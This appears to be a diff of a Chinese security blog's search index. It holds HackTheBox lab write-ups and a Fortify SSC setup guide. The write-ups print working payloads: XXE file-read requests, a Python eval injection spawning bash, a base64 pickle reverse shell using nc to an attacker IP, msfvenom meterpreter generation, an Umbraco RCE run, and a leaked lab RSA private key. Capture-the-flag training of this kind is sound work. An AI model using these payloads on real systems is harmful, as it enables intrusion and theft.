 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用树苺派默认凭证 pi:raspberry 登录SSH</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> pi@mirai.htb              
 The authenticity of <span class="token function">host</span> <span class="token string">'mirai.htb (10.10.10.48)'</span> can<span class="token string">'t be established.
@@ -2351,8 +2414,8 @@ Do you know <span class="token keyword">if</span> there is any way to get them b
   </entry>
   <entry>
     <title>HTB-Blocky</title>
-    <url>/Hackthebox/htb/htb-blocky/</url>
-    <content><![CDATA[<style>.sypfclclptcp{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blocky/f412784c311bdf52c3655381d2c9cd21.png" class="sypfclclptcp">
+    <url>/posts/1cdd7a67.html</url>
+    <content><![CDATA[<style>.bnxvyrhllsrj{zoom:50%;}</style><img src="/posts/1cdd7a67/f412784c311bdf52c3655381d2c9cd21.png" class="bnxvyrhllsrj">
 
 <span id="more"></span>
 
@@ -2394,7 +2457,8 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.37 blocky.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>
 
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问网站可以看到cms为WordPress，可以在文章中找到一个用户名(notch)</p>
-<p><img src="/image-20250302111220868.png" alt="目标"></p>
+<img src="/posts/1cdd7a67/image-20250302111220868.png" class="" title="目标">
+
 <p>使用ffuf 对目录进行扫描，访问 <span class="exturl" data-url="aHR0cDovL2Jsb2NreS5odGIvcGx1Z2lucw==">http://blocky.htb/plugins<i class="fa fa-external-link-alt"></i></span> 发现两个jar包：griefprevention-1.11.2-3.1.1.298.jar 和 BlockyCore.jar</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> http://blocky.htb/FUZZ  <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-ic</span>  
 
@@ -2428,8 +2492,9 @@ phpmyadmin              <span class="token punctuation">[</span>Status: <span cl
 server-status           <span class="token punctuation">[</span>Status: <span class="token number">403</span>, Size: <span class="token number">298</span>, Words: <span class="token number">22</span>, Lines: <span class="token number">12</span>, Duration: 152ms<span class="token punctuation">]</span>
 :: Progress: <span class="token punctuation">[</span><span class="token number">220546</span>/220546<span class="token punctuation">]</span> :: Job <span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> :: <span class="token number">897</span> req/sec :: Duration: <span class="token punctuation">[</span><span class="token number">0</span>:04:56<span class="token punctuation">]</span> :: Errors: <span class="token number">0</span> ::</code></pre>
 
-<p><img src="/image-20250302110356493.png" alt="jar"></p>
-<p>反编译jar包发现密码<img src="/image-20250302110940408.png" alt="反编译"></p>
+<img src="/posts/1cdd7a67/image-20250302110356493.png" class="" title="jar">
+
+<p>反编译jar包发现密码<img src="/posts/1cdd7a67/image-20250302110940408.png" class="" title="反编译"></p>
 <h3 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h3><p>使用获取到的用户名(notch)和密码成功登录SSH</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> notch@blocky.htb 
 The authenticity of <span class="token function">host</span> <span class="token string">'blocky.htb (10.10.10.37)'</span> can<span class="token string">'t be established.
@@ -2496,8 +2561,8 @@ root@Blocky:~<span class="token comment"># id</span>
   </entry>
   <entry>
     <title>HTB-Remote</title>
-    <url>/Hackthebox/htb/htb-remote/</url>
-    <content><![CDATA[<style>.yewcsmykggvw{zoom:50%;}</style><img src="/Hackthebox/htb/htb-remote/8d7c152dc9c28c9556b07dc724c6a37b.png" class="yewcsmykggvw">
+    <url>/posts/685379b3.html</url>
+    <content><![CDATA[<style>.incibuvitsfr{zoom:50%;}</style><img src="/posts/685379b3/8d7c152dc9c28c9556b07dc724c6a37b.png" class="incibuvitsfr">
 
 <span id="more"></span>
 
@@ -2579,10 +2644,13 @@ Session completed.                          </code></pre>
 <p>添加本地域名解析到hosts文件，并访问站点，可以找到一个登录页面</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.180 remote.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>
 
-<p><img src="/image-20250223220027043.png" alt="访问网站"></p>
+<img src="/posts/685379b3/image-20250223220027043.png" class="" title="访问网站">
+
 <p>使用收集到的用户名密码，登录网站，获取网站版本</p>
-<p><img src="/image-20250223220241146.png" alt="登录页面"></p>
-<p><img src="/image-20250223220501688.png" alt="查看版本"></p>
+<img src="/posts/685379b3/image-20250223220241146.png" class="" title="登录页面">
+
+<img src="/posts/685379b3/image-20250223220501688.png" class="" title="查看版本">
+
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过检索可以在github 找到一个利用脚本：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0pvbm9hbnMvVW1icmFjby1SQ0U=">https://github.com/Jonoans/Umbraco-RCE<i class="fa fa-external-link-alt"></i></span></p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ python exploit.py <span class="token parameter variable">-u</span> admin@htb.local <span class="token parameter variable">-p</span> baconandcheese <span class="token parameter variable">-w</span> <span class="token string">'http://remote.htb'</span> <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.16.30
 <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Trying to <span class="token builtin class-name">bind</span> to :: on port <span class="token number">4444</span>: Done
@@ -2734,8 +2802,8 @@ meterpreter <span class="token operator">></span>
   </entry>
   <entry>
     <title>HTB-Love</title>
-    <url>/Hackthebox/htb/htb-love/</url>
-    <content><![CDATA[<style>.preelmguiagz{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="preelmguiagz">
+    <url>/posts/e5f5ab78.html</url>
+    <content><![CDATA[<style>.ipseuublfxhs{zoom:50%;}</style><img src="/posts/e5f5ab78/c00774d8d806b82c709c596937a92d14.png" class="ipseuublfxhs">
 
 <span id="more"></span>
 
@@ -2837,16 +2905,22 @@ Nmap done: <span class="token number">1</span> IP address <span class="token pun
 <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.239 staging.love.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问<code>staging.love.htb</code> 点击Demo 找到一个输入框</p>
-<p><img src="/image-20250222122349377.png" alt="访问"></p>
+<img src="/posts/e5f5ab78/image-20250222122349377.png" class="" title="访问">
+
 <p>使用Python3 启用一个web服务，在输入框中输入url 然后点击<code>Scan file</code> 发现存在SSRF</p>
-<p><img src="/image-20250222123810029.png" alt="SSRF"></p>
+<img src="/posts/e5f5ab78/image-20250222123810029.png" class="" title="SSRF">
+
 <p>依次探测开放端口，发现在5000端口可以读取到凭证</p>
-<p><img src="/image-20250222130122775.png" alt="内网探测"></p>
+<img src="/posts/e5f5ab78/image-20250222130122775.png" class="" title="内网探测">
+
 <p>对<code>love.htb</code>和<code>staging.love.htb</code> 目录进行fuzz 发现<code>love.htb</code> 有个admin页面，使用获取到的帐号密码登录，点击Votes，上传php木马</p>
-<p><img src="/image-20250222131025885.png" alt="文件上传"></p>
+<img src="/posts/e5f5ab78/image-20250222131025885.png" class="" title="文件上传">
+
 <p>使用蚁剑连接shell</p>
-<p><img src="/image-20250222142215068.png" alt="Getshell"></p>
-<p><img src="/image-20250222133719719.png" alt="upload"></p>
+<img src="/posts/e5f5ab78/image-20250222142215068.png" class="" title="Getshell">
+
+<img src="/posts/e5f5ab78/image-20250222133719719.png" class="" title="upload">
+
 <p>将shell从蚁剑转到msfconsole：生成后门，然后使用蚁剑上传文件并执行</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 生成payload</span>
 msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.10</span>.16.30 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> exe <span class="token operator">></span> shell.exe 
@@ -2936,8 +3010,8 @@ Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM</cod
   </entry>
   <entry>
     <title>HTB-BountyHunter</title>
-    <url>/Hackthebox/htb/htb-bountyhunter/</url>
-    <content><![CDATA[<style>.ehksutuhkzfi{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bountyhunter/a24c032885e56a17a6c74cc58b63e8f4.png" class="ehksutuhkzfi">
+    <url>/posts/d750c67f.html</url>
+    <content><![CDATA[<style>.zcwpfosoxslo{zoom:50%;}</style><img src="/posts/d750c67f/a24c032885e56a17a6c74cc58b63e8f4.png" class="zcwpfosoxslo">
 
 <span id="more"></span>
 
@@ -3001,9 +3075,11 @@ portal                  <span class="token punctuation">[</span>Status: <span cl
 db                      <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">0</span>, Words: <span class="token number">1</span>, Lines: <span class="token number">1</span>, Duration: 105ms<span class="token punctuation">]</span></code></pre>
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问&#x2F;portal.php 跳转到表单页面</p>
-<p><img src="/image-20250222104837169.png" alt="跳转"></p>
+<img src="/posts/d750c67f/image-20250222104837169.png" class="" title="跳转">
+
 <p>使用burp进行抓包，对数据包进行base64解码，发现是XML</p>
-<p><img src="/image-20250222104858450.png" alt="表单"></p>
+<img src="/posts/d750c67f/image-20250222104858450.png" class="" title="表单">
+
 <p>尝试进行XXE攻击，找到两个帐号：development和root</p>
 <pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0" encoding="ISO-8859-1"?></span>
 <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY example SYSTEM "file:///etc/passwd"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
@@ -3014,7 +3090,8 @@ db                      <span class="token punctuation">[</span>Status: <span cl
 		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>reward</span><span class="token punctuation">></span></span>20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>reward</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bugreport</span><span class="token punctuation">></span></span></code></pre>
 
-<p><img src="/image-20250222092505979.png" alt="XXE"></p>
+<img src="/posts/d750c67f/image-20250222092505979.png" class="" title="XXE">
+
 <p>使用PHP Wrapper 读取db.php文件</p>
 <pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0" encoding="ISO-8859-1"?></span>
 &lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM php://filter/convert.base64-encode/resource=db.php"> ]>
@@ -3025,11 +3102,14 @@ db                      <span class="token punctuation">[</span>Status: <span cl
 		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>reward</span><span class="token punctuation">></span></span>20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>reward</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bugreport</span><span class="token punctuation">></span></span></code></pre>
 
-<p><img src="/image-20250222094939072.png" alt="XXE"></p>
+<img src="/posts/d750c67f/image-20250222094939072.png" class="" title="XXE">
+
 <p>解码base64,找到数据库密码，使用development登录SSH</p>
-<p><img src="/image-20250222095232981.png" alt="解码"></p>
+<img src="/posts/d750c67f/image-20250222095232981.png" class="" title="解码">
+
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用<code>sudo -l</code>找个一个可利用的Python文件</p>
-<p><img src="/image-20250222101020734.png" alt="提权"></p>
+<img src="/posts/d750c67f/image-20250222101020734.png" class="" title="提权">
+
 <p>分析Python脚本</p>
 <pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#Skytrain Inc Ticket Validation System 0.1</span>
 <span class="token comment">#Do not distribute this file.</span>
@@ -3091,7 +3171,8 @@ main<span class="token punctuation">(</span><span class="token punctuation">)</s
 __Ticket Code:__
 **11+eval(&quot;__import__(&#39;os&#39;).system(&#39;bash&#39;)&quot;)</code></pre>
 
-<p><img src="/image-20250222104056058.png" alt="Getshell"></p>
+<img src="/posts/d750c67f/image-20250222104056058.png" class="" title="Getshell">
+
 <table>
 <thead>
 <tr>
@@ -3118,8 +3199,8 @@ __Ticket Code:__
   </entry>
   <entry>
     <title>HTB-DevOops</title>
-    <url>/Hackthebox/htb/htb-devoops/</url>
-    <content><![CDATA[<style>.pryfzgsbpxdj{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devoops/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="pryfzgsbpxdj">
+    <url>/posts/ddc47498.html</url>
+    <content><![CDATA[<style>.mzmsrlfvmblu{zoom:50%;}</style><img src="/posts/ddc47498/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="mzmsrlfvmblu">
 
 <span id="more"></span>
 
@@ -3187,7 +3268,8 @@ feed                    <span class="token punctuation">[</span>Status: <span cl
 newpost                 <span class="token punctuation">[</span>Status: <span class="token number">405</span>, Size: <span class="token number">178</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">5</span>, Duration: 109ms<span class="token punctuation">]</span></code></pre>
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 &#x2F;upload 在上传文件的地方可以看到xml格式</p>
-<p><img src="/image-20250221224346237.png" alt="upload"></p>
+<img src="/posts/ddc47498/image-20250221224346237.png" class="" title="upload">
+
 <p>构造一个简单xml测试，可以看到Doe被解析出来</p>
 <pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
 <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">example</span> <span class="token attr-name">"Doe"</span><span class="token punctuation">></span></span> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
@@ -3197,7 +3279,8 @@ newpost                 <span class="token punctuation">[</span>Status: <span cl
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>
 
-<p><img src="/image-20250221225731266.png" alt="xxe"></p>
+<img src="/posts/ddc47498/image-20250221225731266.png" class="" title="xxe">
+
 <p>修改xml 读取&#x2F;etc&#x2F;passwd 文件</p>
 <pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
 <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY example SYSTEM "file:///etc/passwd"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
@@ -3207,7 +3290,8 @@ newpost                 <span class="token punctuation">[</span>Status: <span cl
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>
 
-<p><img src="/image-20250221230704068.png" alt="&#x2F;etc&#x2F;passwd"></p>
+<img src="/posts/ddc47498/image-20250221230704068.png" class="" title="&#x2F;etc&#x2F;passwd">
+
 <p>访问网站首页可以看到</p>
 <p>修改xml读取feed.py</p>
 <pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
@@ -3219,7 +3303,8 @@ newpost                 <span class="token punctuation">[</span>Status: <span cl
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>
 
 <p>分析feed.py 文件，提交POST请求时候调用了pickle进行反序列化</p>
-<p><img src="/image-20250221233304683.png" alt="读取feed.py"></p>
+<img src="/posts/ddc47498/image-20250221233304683.png" class="" title="读取feed.py">
+
 <p>利用pickle反序列化漏洞，构造一个反弹shell，提交POST请求包，可成功接收到shell</p>
 <pre class="language-python" data-language="python"><code class="language-python">$ python2                                               
 Python <span class="token number">2.7</span><span class="token number">.18</span> <span class="token punctuation">(</span>default<span class="token punctuation">,</span> Aug  <span class="token number">1</span> <span class="token number">2022</span><span class="token punctuation">,</span> <span class="token number">06</span><span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">:</span><span class="token number">55</span><span class="token punctuation">)</span> 
@@ -3237,7 +3322,8 @@ Type <span class="token string">"help"</span><span class="token punctuation">,</
 <span class="token string">'Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNi4zMCA4MDAxID4vdG1wL2YnCnAxCnRwMgpScDMKLg=='</span>
 </code></pre>
 
-<p><img src="/image-20250221235447552.png" alt="Getshell"></p>
+<img src="/posts/ddc47498/image-20250221235447552.png" class="" title="Getshell">
+
 <h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>在&#x2F;home&#x2F;roosa&#x2F;work&#x2F;blogfeed 目录下，使用git log 查看commit记录可以找到一条关于密钥的记录</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">    reverted accidental commit with proper key
 commit d387abf63e05c9628a59195cec9311751bdb283f
@@ -3313,7 +3399,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 -----END RSA PRIVATE KEY-----
 </code></pre>
 
-<p><img src="/image-20250222085122095.png" alt="Getshell"></p>
+<img src="/posts/ddc47498/image-20250222085122095.png" class="" title="Getshell">
+
 <table>
 <thead>
 <tr>
@@ -3341,13 +3428,14 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>Fortify SSC 24.X 搭建</title>
-    <url>/DevSecOps/tools/fortifyssc/</url>
+    <url>/posts/e4955058.html</url>
     <content><![CDATA[<blockquote>
 <p>Fortify Software Security Center 是一款基于浏览器的产品，可在整个软件开发生命周期中提供一组功能，以自动检测应用程序中的安全漏洞。它通过提供来自 OpenText™ Fortify Static Code Analyzer、OpenText™ Fortify ScanCentral SAST、OpenText™ Fortify ScanCentral DAST 和 Sonatype 的关联数据，帮助安全和开发团队协同工作，通过其协作在线环境快速准确地解决安全漏洞。</p>
 </blockquote>
 <span id="more"></span>
 
-<p><img src="/DraggedImage.png"></p>
+<img src="/posts/e4955058/DraggedImage.png" class="">
+
 <h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
 <li>系统：Windows Server 2022</li>
 <li>软件： Apache Tomcat 9.0.x 、 JDK 17、Fortify Software Security Center 24.2</li>
@@ -3355,11 +3443,17 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <li>账号： 管理员权限</li>
 </ul>
 <h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><h4 id="安装并配置JDK环境"><a href="#安装并配置JDK环境" class="headerlink" title="安装并配置JDK环境"></a>安装并配置JDK环境</h4><p>安装JDK17，配置JDK环境变量，打开命令行输入 java、javac、java - version均有相应回显</p>
-<p><img src="/DraggedImage-1.png" alt="jdk环境"></p>
+<img src="/posts/e4955058/DraggedImage-1.png" class="" title="jdk环境">
+
 <h4 id="安装并配置MySQL"><a href="#安装并配置MySQL" class="headerlink" title="安装并配置MySQL"></a>安装并配置MySQL</h4><p>安装MySQL，选择Custom</p>
-<p><img src="/DraggedImage-2.png" alt="安装Mysql"></p>
+<img src="/posts/e4955058/DraggedImage-2.png" class="" title="安装Mysql">
+
+
+
 <p>安装完成后修改my.ini文件(必需)</p>
-<p>在<code>[mysqld]</code>和<code>[mysqldump]</code>部分中，均设置<code>max\_allowed\_packet</code>为1G,如果没有<code>[mysqldump]</code>,则需要自己创建<br><img src="/DraggedImage-3.png" alt="my.ini"><br>在<code>[mysqld]</code>部分修改</p>
+<p>在<code>[mysqld]</code>和<code>[mysqldump]</code>部分中，均设置<code>max\_allowed\_packet</code>为1G,如果没有<code>[mysqldump]</code>,则需要自己创建</p>
+<img src="/posts/e4955058/DraggedImage-3.png" class="" title="my.ini">
+<p>在<code>[mysqld]</code>部分修改</p>
 <table>
 <thead>
 <tr>
@@ -3392,26 +3486,52 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>“TRADITIONAL”</td>
 </tr>
 </tbody></table>
-<p>保存配置，命令行重启服务（要管理员权限）<br><img src="/DraggedImage-4.png" alt="重启mysql服务"></p>
+<p>保存配置，命令行重启服务（要管理员权限）</p>
+<img src="/posts/e4955058/DraggedImage-4.png" class="" title="重启mysql服务">
+
 <h4 id="导入官方提供的SQL脚本"><a href="#导入官方提供的SQL脚本" class="headerlink" title="导入官方提供的SQL脚本"></a>导入官方提供的SQL脚本</h4><p>新建数据库并导入SQL脚本：数据库字符集设置为<code>utf8\\uft8\_bin</code></p>
-<p><img src="/DraggedImage-5.png" alt="新建数据库"></p>
-<p>禁用安全模式,然后重新连接数据库<br><img src="/DraggedImage-6.png" alt="禁用安全模式"><br><img src="/DraggedImage-7.png" alt="导入sql脚本"></p>
+<img src="/posts/e4955058/DraggedImage-5.png" class="" title="新建数据库">
+
+
+
+<p>禁用安全模式,然后重新连接数据库</p>
+<img src="/posts/e4955058/DraggedImage-6.png" class="" title="禁用安全模式">
+<img src="/posts/e4955058/DraggedImage-7.png" class="" title="导入sql脚本">
+
 <h4 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h4><p>使用安装版安装Tomcat，选择full</p>
-<p><img src="/DraggedImage-8.png" alt="tomcat"><br><img src="/DraggedImage-9.png" alt="tomcat"></p>
+<img src="/posts/e4955058/DraggedImage-8.png" class="" title="tomcat">
+<img src="/posts/e4955058/DraggedImage-9.png" class="" title="tomcat">
+
 <h4 id="配置Tomcat"><a href="#配置Tomcat" class="headerlink" title="配置Tomcat"></a>配置Tomcat</h4><p>清空webapps目录，并放入ssc.war</p>
-<p><img src="/DraggedImage-10.png" alt="webapps"><br>进入<code>Apache Software Foundation\\Tomcat 9.0\\bin</code>, 点开tomcat9w –&gt; Java –&gt; Java options 添加<code>-Dfortify.home=E:\SSC\fortify </code>  –&gt; 修改内存(初始化4G，最大推荐16以上) –&gt; 应用, 然后启动Tomcat<br><img src="/DraggedImage-11.png"></p>
-<style>.epklxugrmrit{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-12.png" class="epklxugrmrit" alt="修改配置">
-<style>.ptwbtcddofie{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-13.png" class="ptwbtcddofie">
+<img src="/posts/e4955058/DraggedImage-10.png" class="" title="webapps">
+<p>进入<code>Apache Software Foundation\\Tomcat 9.0\\bin</code>, 点开tomcat9w –&gt; Java –&gt; Java options 添加<code>-Dfortify.home=E:\SSC\fortify </code>  –&gt; 修改内存(初始化4G，最大推荐16以上) –&gt; 应用, 然后启动Tomcat</p>
+<img src="/posts/e4955058/DraggedImage-11.png" class="">
+<style>.qrtxjhdwskld{zoom:150%;}</style><img src="/posts/e4955058/DraggedImage-12.png" class="qrtxjhdwskld" alt="修改配置">
+<style>.jkmkeazfxtha{zoom:150%;}</style><img src="/posts/e4955058/DraggedImage-13.png" class="jkmkeazfxtha">
 
 <h4 id="安装SSC"><a href="#安装SSC" class="headerlink" title="安装SSC"></a>安装SSC</h4><p> 打开浏览器访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDgwL3NzYy8=">http://127.0.0.1:8080/ssc/<i class="fa fa-external-link-alt"></i></span></p>
-<p><img src="/DraggedImage-14.png" alt="访问SSC"></p>
-<p>打开上面配置的那个fortify home的路径，有个init.token文件，复制内容贴进去<br><img src="/DraggedImage-15.png" alt="获取token"><br><img src="/DraggedImage-16.png" alt="登录"></p>
-<p>上传License<br><img src="/DraggedImage-17.png" alt="上传许可证"><br><img src="/DraggedImage-18.png" alt="默认配置"></p>
+<img src="/posts/e4955058/DraggedImage-14.png" class="" title="访问SSC">
+
+<p>打开上面配置的那个fortify home的路径，有个init.token文件，复制内容贴进去</p>
+<img src="/posts/e4955058/DraggedImage-15.png" class="" title="获取token">
+<img src="/posts/e4955058/DraggedImage-16.png" class="" title="登录">
+
+<p>上传License</p>
+<img src="/posts/e4955058/DraggedImage-17.png" class="" title="上传许可证">
+<img src="/posts/e4955058/DraggedImage-18.png" class="" title="默认配置">
+
+
+
 <p>配置数据</p>
-<p><code>jdbc:mysql://ip:3306/sscsessionVariables=collation_connection=utf8_bin&amp;rewriteBatchedStatements=true</code><br><img src="/DraggedImage-19.png" alt="配置数据库"></p>
-<p>上传种子包，需要按顺序上传<br><img src="/DraggedImage-20.png" alt="upload seed"><br><img src="/DraggedImage-21.png" alt="上传成功"></p>
-<p>重启Tomcat<br><img src="/DraggedImage-22.png" alt="重启服务"></p>
-]]></content>
+<p><code>jdbc:mysql://ip:3306/sscsessionVariables=collation_connection=utf8_bin&amp;rewriteBatchedStatements=true</code></p>
+<img src="/posts/e4955058/DraggedImage-19.png" class="" title="配置数据库">
+
+<p>上传种子包，需要按顺序上传</p>
+<img src="/posts/e4955058/DraggedImage-20.png" class="" title="upload seed">
+<img src="/posts/e4955058/DraggedImage-21.png" class="" title="上传成功">
+
+<p>重启Tomcat</p>
+<img src="/posts/e4955058/DraggedImage-22.png" class="" title="重启服务">]]></content>
       <categories>
         <category>DevSecOps</category>
       </categories>
@@ -3423,8 +3543,8 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   </entry>
   <entry>
     <title>HTB-Jerry</title>
-    <url>/Hackthebox/htb/htb-jerry/</url>
-    <content><![CDATA[<style>.wqhdwnkvqqwk{zoom:50%;}</style><img src="/Hackthebox/htb/htb-jerry/59f03a24178dbb2bdc94968c201e21f8.png" class="wqhdwnkvqqwk">
+    <url>/posts/4797133e.html</url>
+    <content><![CDATA[<style>.fjgvytxxobra{zoom:50%;}</style><img src="/posts/4797133e/59f03a24178dbb2bdc94968c201e21f8.png" class="fjgvytxxobra">
 
 <span id="more"></span>
 
@@ -3440,16 +3560,22 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><p><img src="/image-20250216152859389.png" alt="Nmap"></p>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/posts/4797133e/image-20250216152859389.png" class="" title="Nmap">
+
 <p>开放8080(tomcat)，直接访问可以发现tomcat 默认管理页面</p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问目标，点击<code>Manager App</code> 在弹出的用户名密码界面，随便输入，就会跳转到403页面</p>
-<p><img src="/image-20250216154248837.png" alt="tomcat管理页面"></p>
+<img src="/posts/4797133e/image-20250216154248837.png" class="" title="tomcat管理页面">
+
 <p>页面中出现用户名密码，使用tomcat:s3cret 登录，可以看到部署页</p>
-<p><img src="/image-20250216154409280.png" alt="tomcat报错页面"></p>
+<img src="/posts/4797133e/image-20250216154409280.png" class="" title="tomcat报错页面">
+
 <p>使用msfvenom 生成后门，然后部署到tomcat， 点击应用名触发shell</p>
-<p><img src="/image-20250216154608561.png" alt="生成后门"></p>
-<p><img src="/image-20250216154519146.png" alt="部署war包"></p>
-<p><img src="/image-20250216155106484.png" alt="GetShell"></p>
+<img src="/posts/4797133e/image-20250216154608561.png" class="" title="生成后门">
+
+<img src="/posts/4797133e/image-20250216154519146.png" class="" title="部署war包">
+
